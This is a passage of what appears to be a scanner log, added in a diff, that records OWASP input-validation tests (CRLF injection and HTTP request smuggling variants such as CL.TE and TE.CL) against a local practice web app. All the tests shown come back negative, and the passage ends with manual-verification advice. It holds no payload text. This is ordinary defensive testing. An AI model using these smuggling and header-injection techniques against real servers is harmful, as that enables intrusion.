+2025-08-05 01:14:05.226803 |     - Verify database changes persist
+2025-08-05 01:14:05.226803 | ----- OTG-INPVAL-015 Test Completed -----
+
+2025-08-05 01:14:05.227633 | ----- Starting OTG-INPVAL-016 (HTTP Splitting/Smuggling) -----
+2025-08-05 01:14:05.227633 | 
+[i] Testing for HTTP Splitting (CRLF Injection)
+2025-08-05 01:14:05.227633 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/fi/?page=include.php
+2025-08-05 01:14:05.228730 |   - Testing parameter: page
+2025-08-05 01:14:05.232041 |     [-] No header injection with: Simple CRLF injection
+2025-08-05 01:14:05.235688 |     [-] No header injection with: Full response splitting
+2025-08-05 01:14:05.239990 |     [-] No header injection with: Location header CRLF
+2025-08-05 01:14:05.245654 |     [-] No header injection with: Cookie injection via Location
+2025-08-05 01:14:05.249253 |     [-] No header injection with: Double-encoded CRLF
+2025-08-05 01:14:05.254202 |     [-] No header injection with: Unicode CRLF
+2025-08-05 01:14:05.254202 | 
+[i] Testing URL: http://localhost:8080/login.php
+2025-08-05 01:14:05.254202 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/exec/
+2025-08-05 01:14:05.255464 | 
+[i] Testing for HTTP Smuggling
+2025-08-05 01:14:05.255464 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/fi/?page=include.php
+2025-08-05 01:14:05.258723 |     [-] Server rejected malformed request: Chunked encoding smuggling
+2025-08-05 01:14:05.261692 |     [-] Server rejected malformed request: CL.TE smuggling
+2025-08-05 01:14:05.264539 |     [-] Server rejected malformed request: TE.CL smuggling
+2025-08-05 01:14:05.267150 |     [-] Server rejected malformed request: Double Content-Length
+2025-08-05 01:14:05.267675 | 
+[i] Testing URL: http://localhost:8080/login.php
+2025-08-05 01:14:05.270747 |     [-] Server rejected malformed request: Chunked encoding smuggling
+2025-08-05 01:14:05.273363 |     [-] Server rejected malformed request: CL.TE smuggling
+2025-08-05 01:14:05.275453 |     [-] Server rejected malformed request: TE.CL smuggling
+2025-08-05 01:14:05.280875 |     [-] Server rejected malformed request: Double Content-Length
+2025-08-05 01:14:05.285078 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/exec/
+2025-08-05 01:14:05.292828 |     [-] Server rejected malformed request: Chunked encoding smuggling
+2025-08-05 01:14:05.295875 |     [-] Server rejected malformed request: CL.TE smuggling
+2025-08-05 01:14:05.298325 |     [-] Server rejected malformed request: TE.CL smuggling
+2025-08-05 01:14:05.300491 |     [-] Server rejected malformed request: Double Content-Length
+2025-08-05 01:14:05.301013 | 
+[i] Note: HTTP Smuggling tests may require manual verification:
+2025-08-05 01:14:05.301013 |     - Check server logs for abnormal requests
+2025-08-05 01:14:05.301538 |     - Test with a proxy to observe request parsing
+2025-08-05 01:14:05.301538 |     - Verify with different intermediaries (proxies, WAFs)
+2025-08-05 01:14:05.301994 | ----- OTG-INPVAL-016 Test Completed -----
+
